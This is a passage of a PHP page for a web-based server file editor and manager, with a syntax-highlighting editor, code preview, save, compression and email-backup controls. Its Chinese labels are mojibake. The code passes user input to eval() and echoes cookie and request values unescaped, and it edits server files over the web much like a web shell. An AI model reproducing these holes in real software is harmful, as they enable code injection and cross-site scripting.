  winname.document.open('text/html', 'replace'); 
  winname.opener = null
  winname.document.writeln("<script>");
  winname.document.writeln("function reportError(msg,url,line){\nline-=14;\nvar str='�ҵ�һ��js����: \\n\\n';\nstr+='����ԭ��: '+msg+' \\n�� '+(line+14)+' ��';\nalert(str);\nopener.goto(line);\nopener.focus();\nwindow.onerror=null;\nsetTimeout('self.close()',10);\nreturn true;\n}");
  winname.document.writeln("window.onerror = reportError;");
  winname.document.writeln("<\/script>");
  winname.document.write(obj.value); 
  winname.document.close(); 
 } 
 
 
 
 
 
 
 function  phpL(){
  if($$('bbbbb').style.display=='none'){
	getData2('?bj=1&A=6&dir='+$$('Tdir').value+'&fileName='+$$('T2').value,'bbbbb');
	$$('bbbbb').style.color="";
  $$('bbbbb').style.display='block';
  }else{
	$$('bbbbb').style.display='none';
  }
 }
 function  cssL(){
 	if($$('bbbbb').style.display=='none'){
	CssL();
	$$('bbbbb').style.color="#FF00FF";
  $$('bbbbb').style.display='block';
  }else{
	$$('bbbbb').style.display='none';
	$$('bbbbb').style.color="";
  }
}

 function  jsL(){
 	if($$('bbbbb').style.display=='none'){
  $$('bbbbb').style.display='block';
  btn_click();
  }else{
	$$('bbbbb').style.display='none';
  }
}
//////-------------------js----------------------

function btn_click() {
	var formats = [];
	formats[JSEngine.TYPE_KEYWORD] = { "start": "<span class=\"hl_js_kw\">", "end": "</span>" };
	formats[JSEngine.TYPE_MUTILCOMMENT] = { "start": "<span class=\"hl_js_mcm\">", "end": "</span>" };
	formats[JSEngine.TYPE_SINGLECOMMENT] = { "start": "<span class=\"hl_js_scm\">", "end": "</span>" };
	formats[JSEngine.TYPE_STRING] = { "start": "<span class=\"hl_js_s\">", "end": "</span>" };
	formats[JSEngine.TYPE_REGEXP] = { "start": "<span class=\"hl_js_reg\">", "end": "</span>" };
	formats[JSEngine.TYPE_NUMBER] = { "start": "<span class=\"hl_js_num\">", "end": "</span>" };
	formats[JSEngine.TYPE_TYPES] = { "start": "<span class=\"hl_js_typ\">", "end": "</span>" };
	var pre = $$("bbbbb");
	var area = $$("c2");
	var engine = new JSEngine();
	var code = area.value.replace(/</g, "&lt;").replace(/>/g, "&gt;");
	var dt = new Date();
	str = engine.parseSyntax(code, formats);
	//$$("msg").innerHTML = "����" + code.length + "���ַ�, ������ʱ" + (new Date().getTime() - dt.getTime()) + "ms";
	
	str = str.replace(/^(\t+)/gm, function(m) {
		return (new Array(m.length + 1)).join("&#160;&#160;&#160;&#160;");
	});
	str = str.replace(/^( +)/gm, function(m) {
		return (new Array(m.length + 1)).join("&#160;");
	});
	
	str = str.replace(/\r?\n/g, "<br/>");
	
	pre.innerHTML = str;
}

window.onload = function() {
	$$("btn").onclick = btn_click;
}


var keywords = "Array|arguments|Boolean|Date|Enumerator|Error|Function|Global|Math|Number|Object|RegExp|String|break|delete|function|return|typeof|case|do|if|switch|var|catch|else|in|this|void|continue|false|instanceof|throw|while|debugger|finally|new|true|with|default|for|null|try|abstract|double|goto|native|static|boolean|enum|implements|package|super|byte|export|import|private|synchronized|char|extends|int|protected|throws|class|final|interface|public|transient|const|float|long|short|volatile";
var types = "Anchor|Applet|Area|Arguments|Array|Boolean|Button|Checkbox|Collection|Crypto|Date|Dictionary|Document|Drive|Drives|Element|Enumerator|Event|File|FileObject|FileSystemObject|FileUpload|Folder|Folders|Form|Frame|Function|Global|Hidden|History|HTMLElement|Image|Infinity|Input|JavaArray|JavaClass|JavaObject|JavaPackage|JSObject|Layer|Link|Math|MimeType|Navigator|Number|Object|Option|Packages|Password|Plugin|PrivilegeManager|Random|RegExp|Screen|Select|String|Submit|Text|Textarea|URL|VBArray|Window|WScript|window";
function JSEngine(){};

JSEngine.TYPE_KEYWORD = 0;
JSEngine.TYPE_MUTILCOMMENT = 1;
JSEngine.TYPE_SINGLECOMMENT = 2;
JSEngine.TYPE_STRING = 3;
JSEngine.TYPE_REGEXP = 4;
JSEngine.TYPE_NUMBER = 5;
JSEngine.TYPE_TYPES = 6;

var _p = JSEngine.prototype;

var _p = JSEngine.prototype;

var _p = JSEngine.prototype;

_p.parseSyntax = function(code, formats) {
	var buff = [], codeBuff = code, codeLen = code.length, sIdx = 0, buffIdx = 0, objBuff = [];
	var stopIdx = codeLen, searchResult = null, result = null, len = 0;
	var flgs = { "string1": true, "string2": true, "mutilcm": true, "singlecm": true, "regcm": true };
	
	while(flgs["string1"] || flgs["string2"] || flgs["mutilcm"] || flgs["singlecm"] || flgs["regcm"])
	{
		searchResult = null;
		codeLen = code.length;
		stopIdx = codeLen;

		if (flgs["string1"]) {
			result = searchString(code, codeLen, sIdx, stopIdx, "\"");

			switch(result) {				
				case null: flgs["string1"] = false; break;
				case -1: break;
				default: {
					searchResult = result;
					searchResult[3] = JSEngine.TYPE_STRING;
					stopIdx = result[0];
					break;
				}
			}
			
		}
		
		if (flgs["string2"]) {
			result = searchString(code, codeLen, sIdx, stopIdx, "\'");

			switch(result) {				
				case null: flgs["string2"] = false; break;
				case -1: break;
				default: {
					searchResult = result;
					searchResult[3] = JSEngine.TYPE_STRING;
					stopIdx = result[0]; 
					break;
				}
			}
		}
		
		if (flgs["mutilcm"]) {
			result = searchMutilComments(code, codeLen, sIdx, stopIdx);

			switch(result) {				
				case null: flgs["mutilcm"] = false; break;
				case -1: break;
				default: {
					searchResult = result;
					searchResult[3] = JSEngine.TYPE_MUTILCOMMENT;
					stopIdx = result[0]; 
					break;
				}
			}
		}
		
		if (flgs["singlecm"]) {
			result = searchSingleComments(code, codeLen, sIdx, stopIdx);

			switch(result) {				
				case null: flgs["singlecm"] = false; break;
				case -1: break;
				default: {
					searchResult = result;
					searchResult[3] = JSEngine.TYPE_SINGLECOMMENT;
					stopIdx = result[0]; 
					break;
				}
			}
		}
		
		if (flgs["regcm"]) {
			result = searchRegexp(code, codeLen, sIdx, stopIdx);

			switch(result) {				
				case null: flgs["regcm"] = false; break;
				case -1: break;
				default: {
					searchResult = result;
					searchResult[3] = JSEngine.TYPE_REGEXP;
					
					break;
				}
			}
		}
		
		if (searchResult == null) {
			buff.push(code);
			break;
		} else {
			
			len = searchResult[1] - searchResult[0] + searchResult[2];
			
			if (searchResult[0] != 0) {
				buff.push(code.substring(sIdx, searchResult[0]))
			}
			
			objBuff.push([code.substring(searchResult[0], searchResult[1] + searchResult[2]), searchResult[3]]);
			buff.push("<_" + (objBuff.length - 1) + "_>");
			sIdx = searchResult[1] + searchResult[2];
			code = code.substr(sIdx);
			sIdx = 0;
		}
	}

	
	buff = buff.join("");
	reg = new RegExp("\\b(" + keywords + ")\\b", "g");
	result = formats[JSEngine.TYPE_KEYWORD].start + "$1" + formats[JSEngine.TYPE_KEYWORD].end;
	buff = buff.replace(reg, result);
	reg = new RegExp("\\b(" + types + ")\\b", "g");
	result = formats[JSEngine.TYPE_TYPES].start + "$1" + formats[JSEngine.TYPE_TYPES].end;
	buff = buff.replace(reg, result);
	reg = /\b([+-]?(?:\d+(?:\.\d*)?(?:e[+-]?\d+)?|0x[\dA-F]+))\b/gim;
	result = formats[JSEngine.TYPE_NUMBER].start + "$1" + formats[JSEngine.TYPE_NUMBER].end;
	buff = buff.replace(reg, result);
	
	buff = buff.replace(/<_(\d+)_>/g, function(m, n) {
		return formats[objBuff[n][1]].start + objBuff[n][0] + formats[objBuff[n][1]].end;
	});
	
	//return buff.join("");
	return buff;
}

function searchMutilComments(code, codeLen, sIdx, stopIdx) {
	var startIdx = -1, endIdx = -1;

	if (codeLen < 4) return null;

	startIdx = code.indexOf("/*", sIdx);

	if (startIdx == -1) return null;
	if (startIdx > stopIdx) return -1;

	endIdx = code.indexOf("*/", startIdx + 2);

	if (endIdx == -1) return null;

	return [startIdx, endIdx, 2];
}

function searchString(code, codeLen, sIdx, stopIdx, ch) {
	var at = sIdx, i = 0, isEscape = false, startIdx = -1, endIdx = -1, len = 0;
	var isMutilLine = false, fragments = null, isContinueSearch = false, tCh = null, fragm = null, fragmLen = 0;

	if (codeLen < 2) return null;
		
	while(true) {
		startIdx = code.indexOf(ch, at);
		
		if (startIdx == -1) return null;

		if (startIdx > stopIdx) return -1;

		if (startIdx > at) {
			i = startIdx, isEscape = false;
			
			while(code.charAt(--i) == "\\") isEscape = !isEscape;
			
			if (isEscape) {
				at = startIdx + 1;

				if ((at + 2) > stopIdx) return -1;

				continue;
			}
		}
		
		break;
	}
	if (startIdx > stopIdx) return -1;
	
	at = startIdx + 1;

lab_searchString:
	while(true) {

		while(true) {
			endIdx = code.indexOf(ch, at);
			
			if (endIdx == -1) return null;
			
			if (endIdx > at) {
				i = endIdx, isEscape = false;
				
				while(code.charAt(--i) == "\\") isEscape = !isEscape;
				
				if (isEscape) {
					at = endIdx + 1;
					
					continue;
				}
			}
			
			break;
		}
		
		isMutilLine = code.indexOf("\n", startIdx + 1);
		
		if (isMutilLine != -1 && isMutilLine < endIdx) {
			fragments = code.substring(startIdx + 1, endIdx).split("\n");
			len = fragments.length - 1;
			
			for (i = 0; i < len; i++) {
				fragm = fragments[i];
				fragmLen = fragm.length;
				tCh = fragm.charCodeAt(fragmLen - 1) == 13 ? fragm.charAt(fragmLen - 2) : fragm.charAt(fragmLen - 1);
				
				if (tCh != "\\") {
					if (endIdx > stopIdx) return -1;
					if ((endIdx + 1) == stopIdx) return -1;
					startIdx = endIdx;
					at = startIdx + 1;
					continue lab_searchString;
				}
			}
		}
		
		break;
	}
	
	return [startIdx, endIdx, 1];
}

function searchSingleComments(code, codeLen, sIdx, stopIdx) {
	var at = sIdx, i = 0, isEscape = false, startIdx = -1, endIdx = -1;
	
	if (codeLen < 2) return null;
	
	while(true) {
		startIdx = code.indexOf("//", at);
		
		if (startIdx == -1) return null;
		if (startIdx > stopIdx) return -1;
		
		if (startIdx > at) {
			i = startIdx, isEscape = false;
			
			while(code.charAt(--i) == "\\") isEscape = !isEscape;
			
			if (isEscape) {
				at = startIdx + 2;
				
				if ((at + 3) > stopIdx) return -1;
				
				continue;
			}
		}
		
		break;
	}
	
	endIdx = code.indexOf("\n", startIdx + 2);
	return [startIdx, endIdx == -1 ? code.length : endIdx, 0];
}

function searchRegexp(code, codeLen, sIdx, stopIdx) {
	var at = sIdx, i = 0, isEscape = false, tmpResult = null, ch = null, endAt = 0, tmpStr = null;
	var startIdx = -1, tSIdx = -1, eStopIdx = -1, endIdx = -1, escapeFlg = "\\", bIdx = -1, eIdx = -1, bAt = -1, eAt = -1;
	
	function sEnd(code, startIdx) {
		var endIdx = -1, endAt = startIdx, i = 0, isEscape = false;
		
		while(true) {
			endIdx = code.indexOf("/", endAt);
			
			if (endIdx == -1) return -1;
			
			i = endIdx, isEscape = false;
			
			while(code.charAt(--i) == "\\") isEscape = !isEscape;
			
			if (isEscape) {
				endAt = endIdx + 2;
				continue;
			} else {
				return endIdx;
			}
		}
	}
	
	if (codeLen < 2) return null;

	while(true) {
	
		startIdx = code.indexOf("/", at);
		
		if (startIdx == -1) return null;
		if (startIdx > stopIdx) return -1;
		
		switch(code.charAt(startIdx + 1)) {
			case null :
			case "\r":
			case "\n":
			case "*":
			case "/": {
				at = startIdx + 2;
				
				if ((at + 2) > stopIdx) return -1;
				
				continue;
			}
		}
		
		if (startIdx > at) {
			i = startIdx, isEscape = false;
			
			while(code.charAt(--i) == "\\") isEscape = !isEscape;
			
			if (isEscape) {
				at = startIdx + 2;
				
				if ((at + 3) > stopIdx) return -1;
				
				continue;
			}
		}
		
		tmpResult = code.indexOf("\n", startIdx + 1); //�������ڲ�ͬ��
		eStopIdx = tmpResult == -1 ? codeLen : tmpResult;
	
		tmpStr = code.substring(0, startIdx);

		if(!/(?:[!=(,:+\-*%&|!~\[\/\n;{}?\r\n]|typeof|in|instanceof|void|new|return|do|else|throw|^)[ \t]*$/.test(tmpStr)) {
			at = startIdx + 1;
			
			continue;
		}
		
		endAt = (code.charAt(startIdx + 1) == "[" ? 1 : 2) + startIdx;
		endIdx = sEnd(code, endAt);
		
		if (endIdx == -1) return null;
		
		bAt = startIdx + 1;
		
		while(true) {
			bIdx = code.indexOf("[", bAt);
			
			if (bIdx == -1) break;
			
			i = bIdx, isEscape = false;
				
			while(code.charAt(--i) == "\\") isEscape = !isEscape;
			
			if (isEscape) {
				bAt = bIdx + 1;
				continue;
			}
			
			if (bIdx > endIdx) break;
			
			eAt = bIdx + 2;
			
			while(true) {
				eIdx = code.indexOf("]", eAt);
				
				if (eIdx == -1) break;
				
				i = eIdx, isEscape = false;
				
				while(code.charAt(--i) == "\\") isEscape = !isEscape;
				
				if (isEscape) {
					eAt = eIdx + 1;
					continue;
				}
				
				if (eIdx > endIdx) {
					endAt = eIdx + 1;
					endIdx = sEnd(code, endAt);
					
					if (endIdx == -1) return null;
				}
				
				bAt = eIdx + 1;
				break;
			}
		}
		
		
		if (endIdx > eStopIdx) {
			at += 1;
			continue;
		}

		break;
	}
	
	return [startIdx, endIdx, 1];
}

function utf8gbk($b){
	$$('bmutf8').value=$b;
	if($b=="UTF-8" || $b=="UTF8-BOM"){
		$$('utf8').style.display='block';
		$$('gbk').style.display='none';
	}else{
		$$('utf8').style.display='none';
		$$('gbk').style.display='block';
	}
}





function lovek(){

var changeW=function(){
var obj_w=parseInt($$('love').style.right);	
  if(obj_w<0){ 
  $$('love').style.right=(obj_w+Math.ceil((0-obj_w)/1.5))+"px";
  }else{
  clearInterval(b1);
  }
} 
  var b1=window.setInterval(changeW,50);//ÿ0.001�����һ��changeW
  $$('love2').style.display='none';
}


function loveg(){
if(parseInt($$('love').style.right)>=0){
var changeW=function(){
var obj_w=parseInt($$('love').style.right);	
  if(obj_w>-315){
  $$('love').style.right=obj_w-Math.ceil(315/1.5)+"px";;
  }else{
  $$('love2').style.display='block';
  $$('love').style.right="-315px";
  clearInterval(b2);
  }
} 
var b2=window.setInterval(changeW,50);//ÿ0.001�����һ��changeW
}
}


</script>
<!--[if IE 6]>
<style>
	#ci2{display:none}
</style>
<![endif]-->
<div id="smallLay15" style="display:none">
<table border="0" width="350" height="120" cellspacing="0" cellpadding="0">
	<tr>
		<td height="20" bgcolor="#808080"><table border="0" width="100%"><tr><td width="20" align="right"><div class="icon_zip"></div></td><td><font color="#FFFFFF">�滻����</font></td></tr></table></td>
	</tr>
	<tr>
		<td  bgcolor="#FFFFFF" align="center" height="100">
ԭʼ����:<input id="search" value="" /><br>
��  ��  Ϊ:<input id="replace" value="" /><br>
<input type="submit" id="action" value="ȫ���滻" onclick="th()"/>
    </td>
	</tr>
</table>
</div>

<table border="0" width="100%" height="100%">
	<tr>
		<td valign="top" height="20"  id="menu4">
			
<form method="POST" action="?bj=1&A=10&new=<?=$new?>" target="header" id="jstsf">
<div id="button"></div>

                </td>
        </tr>
        <tr>
		<td>
<table border="0" width="100%" cellspacing="0" cellpadding="0"  class="LR">
			<tr>
				<td valign="top" width="<?if($_COOKIE[love1]==""){echo "250";}else{echo $_COOKIE[love1];}?>" bgcolor="#CCCCCC" title="oWin" id="MF">
<table border="0" cellspacing="0" cellpadding="0" height="100%" width=100% bgcolor="#ffffff">
			<tr>
				<td valign="top" id="M1"><div id="divimg" style="position:absolute;border:1px #EEE solid; z-index:5; height:50px;  width:100px; display:none;background:#fff;"><img src=""  id="imgsrc" width="100"  height="50"></div><div id="M"></div></td>
			</tr>
			<tr>
				<td valign="top" id="F1">
					<div id="F"></div>
				</td>
			</tr>
</table>
				</td>
<td valign="top" id="c2td">
<div style="height:0px;width:99%;">
	<div style="height:400px;width:1px;position:absolute;left:-900px;z-index:10;background:#<?if($_COOKIE[love2]==""){echo $color1;}else{echo $_COOKIE[love2];}?>;" id="mjs"></div>
	
	<div style="padding:15px;padding-top:5px;background:#fff;width:320px;position:absolute;right:45px;top:120px;display:none;" id="fanyi1">
		<div style="text-align:right;padding:5px;"><a href="#" onclick="$$('fanyi1').style.display='none';">�ر�</a></div>
		<div id="fanyi"><img src="?imgname=throbber100.gif"></div>
	</div>	
</div>

<div id="ci" style="margin-left:45px;background:url(?imgname=allbgs3.gif) 0px 0px;height:14px;width:700px;cursor:e-resize;overflow:hidden;" onclick="test(event)"><img id="ci2" border="0" src="?imgname=allbgs3.gif" style="position:relative;left:0px;"></div>
<table border="0" width="99%" cellspacing="0" cellpadding="0" id="test">
<tr>
<td id="ol" valign="top" onclick="$$('mjs').style.left='-900px';"><textarea oncontextmenu="return false" cols="2" rows="10" id="li" disabled></textarea><input name="remLen" type="text" value="0" size="5" readonly="readonly" id="as"></td>
<td id="ol2" valign="top">
<div id="love" style="z-index:99;right:-317px;width:320px;height:100%;position:absolute;">
<div style="width:5px;height:100%;float:left;cursor: pointer;background:#fff;" onMouseOver="lovek()" id="love2"> </div>
<div style="width:305px;height:100%;background:#fff;">
<table border="0" width="300" height="100%">
	<tr>
		<td colspan="2" height="1%"><input type="text" style="width:210px;" id="aaaa1" onkeyup="addCookie('aaaa1',escape(this.value),999999999)" value="<?=iconv('utf-8', 'gb2312',js_unescape($aaaa1))?>"><input type="button" value="����" onclick="AddOnPos($$('c2'),$$('aaaa1').value);"></td>
	</tr>
	<tr>
		<td colspan="2" height="1%"><input type="text" style="width:210px;" id="aaaa2" onkeyup="addCookie('aaaa2',escape(this.value),999999999)" value="<?=iconv('utf-8', 'gb2312',js_unescape($aaaa2))?>"><input type="button" value="����" onclick="AddOnPos($$('c2'),$$('aaaa2').value);"></td>
	</tr>
	<tr>
		<td colspan="2" height="1%"><input type="text" style="width:210px;" id="aaaa3" onkeyup="addCookie('aaaa3',escape(this.value),999999999)" value="<?=iconv('utf-8', 'gb2312',js_unescape($aaaa3))?>"><input type="button" value="����" onclick="AddOnPos($$('c2'),$$('aaaa3').value);"></td>
	</tr>
	<tr>
		<td colspan="2" height="1%"><input type="text" style="width:210px;" id="aaaa4" onkeyup="addCookie('aaaa4',escape(this.value),999999999)" value="<?=iconv('utf-8', 'gb2312',js_unescape($aaaa4))?>"><input type="button" value="����" onclick="AddOnPos($$('c2'),$$('aaaa4').value);"></td>
	</tr>
	<tr>
		<td colspan="2" height="1%"><input type="text" style="width:210px;" id="aaaa5" onkeyup="addCookie('aaaa5',escape(this.value),999999999)" value="<?=iconv('utf-8', 'gb2312',js_unescape($aaaa5))?>"><input type="button" value="����" onclick="AddOnPos($$('c2'),$$('aaaa5').value);"></td>
	</tr>
	<tr>
		<td colspan="2" height="1%">
			<input type="button" value="�ر�" onclick="loveg();">
			<input type="button" value="style" onclick="AddOnPos($$('c2'),'<style></style>');">
			<input type="button" value="script" onclick="AddOnPos($$('c2'),'<script></script>');">
			<input type="button" value="img" onclick="AddOnPos($$('c2'),'<img src=\'\' border=\'0\'>');">
		        <input type="button" value="a" onclick="AddOnPos($$('c2'),'<a href=\'\'></a>');">
		</td>
	</tr>
	<tr>
		<td height="1%" width="90">PHP������ѯ:</td>
		<td height="1%"><input type="text" style="width:190px;" id="aaaaphp" onKeyup="getData2('?hscx=1&n='+escape(this.value),'aaaa');" title="�ո��ѯ����"></td>
	</tr>
	<tr>
		<td height="1%">JS������ѯ:</td>
		<td height="1%"><input type="text" style="width:190px;" id="aaaajs" onKeyup="getData2('?hscx=2&n='+escape(this.value),'aaaa');" title="�ո��ѯ����"></td>
	</tr>
	<tr>
		<td height="1%">CSS������ѯ:</td>
		<td height="1%"><input type="text" style="width:190px;" id="aaaajs" onKeyup="getData2('?hscx=3&n='+escape(this.value),'aaaa');" title="�ո��ѯ����"></td>
	</tr>
	<tr>
		<td colspan="2" height="40%">
			<div id="aaaa" style="outline:none;line-height:20px;border:1px solid #E0E0E0;height:100%;width:280px;white-space:nowrap;overflow:auto" contenteditable="true" nowrap></div>
    </td>
	</tr>
</table>

</div>
</div>
	<div style="height:0px;width:100%;"><div onscroll="autoScroll()" id="bbbbb" style="outline:none;display:none;"  contenteditable="true"></div></div><textarea name="co" wrap="off"  id="c2" onMouseUp="ack()" onKeyDown="textCounter();" onkeyup="keyUp(),textCounter();" onscroll="$$('li').scrollTop = this.scrollTop; $$('ci2').style.left=0-this.scrollLeft+'px';" ></textarea></td>
</tr>
</table>
<div>
	<input type="button" value="DIV" onclick="AddOnPos($$('c2'),'<div></div>');">
	<input type="button" value="IMG" onclick="AddOnPos($$('c2'),'<img src=\'\' border=\'0\'>');">
	<input type="button" value="A" onclick="AddOnPos($$('c2'),'<a href=\'\'></a>');">
	<input type="button" value="Style" onclick="AddOnPos($$('c2'),'<style></style>');">
	<input type="button" value="Script" onclick="AddOnPos($$('c2'),'<script></script>');">
	<input type="button" value="PHP" onclick="AddOnPos($$('c2'),'&lt;??&gt;');">
        <input type="button" value="��������" onclick="AddOnPos($$('c2'),show());">
<!------------------------------------------------------------------------------------>
<input type="button" value="����ɫֵ" onclick="AddOnPos($$('c2'),$$('nowColor').value);">
<input type="text" size="7" id="nowColor" onclick="colorSelect('nowColor','nowColor',event)"/>
<!------------------------------------------------------------------------------------>
</div>
</td>
			</tr>
</table>
                </td>
	</tr>
	<tr>
		<td valign="top" height="40">
<input type="hidden" readonly  name="1" size="0" id="bmutf8"  value="0" >
<input type="hidden" readonly  name="B52" size="0" id="yl"  value="0" >
<input type="hidden" readonly  name="new" size="10" id="Td3"  value="<?=$new?>" >
<input type="hidden" readonly  name="B53" size="10" id="Tdir2"  value="0" >
<input type="hidden" readonly name="dir" size="20" id="Tdir" value="<?=$dir?>" >
<input type="hidden" readonly name="Fname" size="10" id="T2" value="<?=$fileName?>" >

<table border="0" width="100%">
	<tr>
		<td width="110">
			<span id="utf8" style="display:none"><input type="submit" value="�ύ����UTF8" class="submit" name="B1" id="TJ2" onclick="$$('yl').value='utf8';" style="width:103px;background:url(?imgname=allbgs.gif) no-repeat 0px -446px;height:21px;"  title="��Ҫֱ�ӱ���UTF8������ļ�,��������ǰ�BG2312ת��ΪUTF8����"></span>
			<span id="gbk" style="display:none"> <input type="submit" value="�ύ���� GBK"  class="submit" name="B1" id="TJ" onclick="$$('yl').value=0;" style="width:103px;background:url(?imgname=allbgs.gif) no-repeat 0px -446px;height:21px"></span>
		</td>
		<td>
<label for="zfanyi11" onclick="utf8gbk('UTF-8');"><input type="radio" id="zfanyi11" value="V1" <?if($encode=="UTF-8" || $encode=="UTF8-BOM"){echo "checked";}?> name="R112345464545">UTF8</label>
<label for="zfanyi22" onclick="utf8gbk('GB2312');"><input type="radio" id="zfanyi22" value="V2" <?if($encode!="UTF-8" && $encode!="UTF8-BOM"){echo "checked";}?> name="R112345464545">GB2312</label>
<input type="button" value="����������" class="submit" name="B1" onclick="window.open($$('Tdir').value+'/'+$$('T2').value)" style="width:85px;background:url(?imgname=allbgs.gif) no-repeat 0px -174px;height:21px;" title="���ȱ���������">
<input type="button" value="���ص���" class="submit" onclick="runCode(c2)" style="width:75px;background:url(?imgname=allbgs.gif) no-repeat 0px -174px;height:21px;"> 
<input type="button" value="���¼���" class="submit" name="B1" onclick="if(confirm('ȷ���������ĵ�?')){if($$('bmutf8').value=='UTF-8'){getData('?bj=1&A=utf8&dir='+$$('Tdir').value+'&fileName='+$$('T2').value,'c2');}else{getData('?bj=1&A=1&dir='+$$('Tdir').value+'&fileName='+$$('T2').value,'c2');}}" style="width:75px;background:url(?imgname=allbgs.gif) no-repeat 0px -206px;height:21px;">
<?if(getphpcfg('mail')=="Yes"||(file_exists('class.phpmailer.php')&&file_exists('class.smtp.php'))){?>
<input type="button" value="���ݵ�����" class="submit" name="B1" onclick="$$('ajaxurl').src='?action=email&to=<?=$color8?>&from=<?=$color5?>&subject=<?=date("Y��m��d�� h:i:s",time())?> '+$$('T2').value+'&body=���ٱ���&dir='+$$('Tdir').value+'&file[]='+$$('T2').value" style="width:85px;background:url(?imgname=allbgs.gif) no-repeat 0px -62px;height:21px;" title="���ٱ��ݵ� <?=$color8?>,���ȱ����ڱ���">
<?}?>
<input type="button" value="��ת" name="B1" onclick="$$('c2').scrollTop=($$('Nh').value*20-20),$$('bbbbb').scrollTop=($$('Nh').value*20-20);"><input type="text" id="Nh" size="3" onkeydown="return disableEnter(event)">    
<input type="button" value="����ѡ�е�����Ϊ" name="B1" onclick="getSelectedText();">
<select size="1" name="FYD1" id="FYD1">
			<option value="zh-CHS">��������</option>
			<option value="zh-CHT">��������</option>
			<option value="en">Ӣ��</option>
			<option value="ja">����</option>
</select><label for="zfanyi" onclick="ack()"><input type="checkbox" id="zfanyi" <?if($_COOKIE[zfanyi]==1){echo "checked";}?>>�Զ�</label>
		</td>
	</tr>
</table>

    </td>
	</tr>
</table>
</form>
<script language="javascript" type="text/javascript">
 function textCounter() {
    $$("as").value =  document.getElementById("c2").value.length;
    $$("TJ").value="�ύ���� GBK";
}
/////----------------�滻����---------------------
function th(){
		var a = $$("search").value;
		var b = $$("replace").value;
		var c = $$("c2").value=$$("c2").value.replace(eval("/" + a + "/gi"), b);
}
/////----------------ѡ�з���---------------------
    function getSelectedText(){ 
        var selectedText; 
        var textField=document.getElementById('c2'); 
        if(window.getSelection) selectedText=getTextFieldSelection(textField);//getTextFieldSelection(document.getElementById("inputTextArea")); 
        else selectedText=document.selection.createRange().text; 
if(selectedText!=''){
$$('fanyi').innerHTML="<img src=?imgname=throbber100.gif>";
getData2('?action=Bing&txt='+selectedText+'&to='+$$('FYD1').value,'fanyi');
$$('fanyi1').style.display="";
}else{
	alert('û��ѡ���ı�');
}
    } 
function ack(){
	if($$('zfanyi').checked){
		addCookie('zfanyi',1);    
    var myDiv =getSelectedText2();          
    if(myDiv.length > 0){
    	 getSelectedText();
    }
  }else{
  	addCookie('zfanyi',0); 
  }
}  
    function getSelectedText2(){ 
        var selectedText; 
        var textField=document.getElementById('c2'); 
        if(window.getSelection) selectedText=getTextFieldSelection(textField);//getTextFieldSelection(document.getElementById("inputTextArea")); 
        else selectedText=document.selection.createRange().text; 
return selectedText;
    } 
    function getTextFieldSelection(e){ 
        if(e.selectionStart != undefined && e.selectionEnd != undefined) 
            return e.value.substring(e.selectionStart,e.selectionEnd); 
        else return ""; 
    } 
//////--------------------css---------------------
function CssL(){
	var code=$$("c2").value;
	//����ע�ͣ�ע���滻�� _����_ 
	var startIdx=endIndex=-1;
	var at=0;
	var commentList=[];
	while(true){
		startIndex=code.indexOf("/*",at);
		if(startIndex==-1)break;
		endIndex=code.indexOf("*/",startIndex);
		if(endIndex==-1)break;
		at=endIndex+2;
		commentList.push(code.substring(startIndex,at));
		code=code.replace(commentList[commentList.length-1],"_"+(commentList.length-1)+"_");
	}
	//�ַ���
	code=code.replace(/(['"]).*\1/g,function(m){return "<span style=\"color:#060;\">"+m+"</span>"});
	//CSS��ʽֵ
	code=code.replace(/:(.+);/g,function(m,n){return ":<span style=\"color:#00F;\">"+n+"</span>;"});
	//CSS��ʽ����
	code=code.replace(/[{}]/g,function(m){
		if(m=="{"){
			return "{<span style=\"color:#FF6600;\">";
		}else{
			return "</span>}";
		}
	});
	//ע��
	code=code.replace(/_(\d+)_/g,function(m,n){return "<span style=\"color:#999;\">"+commentList[n]+"</span>"});
	//����\t
	code=code.replace(/^(\t+)/gm,function(m){
		return (new Array(m.length+1)).join("&nbsp;&nbsp;&nbsp;&nbsp;");									
	});
	//�����ո�
	code=code.replace(/^( +)/gm, function(m) {
		return (new Array(m.length + 1)).join("&nbsp;");
	});
	//��������
	code=code.replace(/\r?\n/g,"<br />");
	$$("bbbbb").innerHTML=code;
	$$('bbbbb').scrollTop=$$('c2').scrollTop;
}

//////------------------------------------------    
var num="";
function keyUp(){
var obj=$$("c2");
var str=obj.value; 
str=str.replace(/\r/gi,"");
str=str.split("\n");
n=str.length;
line(n);
}
function line(n){
var lineobj=$$("li");
for(var i=1;i<=n;i++){
if(document.all){
num+=i+"\r\n";
}else{
num+=i+"\n";
}
}
lineobj.value=num;
num="";
}
function autoScroll(){
var nV = 0;
//alert($$("bbbbb").style.display); 
if($$("bbbbb").style.display=='none'){
if(!document.all){
nV=$$("c2").scrollTop;
$$('bbbbb').scrollTop=$$("li").scrollTop=nV;
setTimeout("autoScroll()",100);
}
}else{
nV=$$('bbbbb').scrollTop;
$$("c2").scrollTop=$$("li").scrollTop=nV;
setTimeout("autoScroll()",100);
}
 
}
if(!document.all){
window.addEventListener("load",autoScroll,false);
}
</script>
<?
}else{
/////////////////////////////////////////�ļ��б�///////////////////////////////////////////
$i=1;
?>
<form method="POST" action="?" id="MFform" target="header">
<div id="smallLay5" style="display:none">
<table border="0" width="350" height="120" cellspacing="0" cellpadding="0">
	<tr>
		<td height="20" bgcolor="#808080"><table border="0" width="100%"><tr><td width="20" align="right"><div class="icon_zip"></div></td><td><font color="#FFFFFF">zip ѹ���ļ�</font></td></tr></table></td>
	</tr>
	<tr>
		<td  bgcolor="#FFFFFF" align="center" height="100">
·����ZIP�ļ�����:<input type="text" name="key" size="20" id="newT3" value="" onkeydown="return disableEnter(event)"><input type="button" value="ѹ��" name="B1" onclick="zip();">
           </td>
	</tr>
</table>
</div>

<div id="smallLay6" style="display:none">
<table border="0" width="350" height="120" cellspacing="0" cellpadding="0">
	<tr>
		<td height="20" bgcolor="#808080"><table border="0" width="100%"><tr><td width="20" align="right"><div class="icon_tgz"></div></td><td><font color="#FFFFFF">tgz ѹ���ļ�</font></td></tr></table></td>
	</tr>
	<tr>
		<td  bgcolor="#FFFFFF" align="center"  height="100">
·����TGZ�ļ�����:<input type="text" name="key2" size="20" id="newT4" value="" onkeydown="return disableEnter(event)"><input type="button" value="ѹ��" name="B1" onclick="tgz();">
           </td>
	</tr>
</table>
</div>

<div id="smallLay7" style="display:none">
<table border="0" width="350" height="120" cellspacing="0" cellpadding="0">
	<tr>
		<td height="20" bgcolor="#808080"><table border="0" width="100%"><tr><td width="20" align="right"><div class="icon_jie"></div></td><td><font color="#FFFFFF">��ѹ�ļ�(zip.���ѹʧ���볢�����ע��)</font></td></tr></table></td>
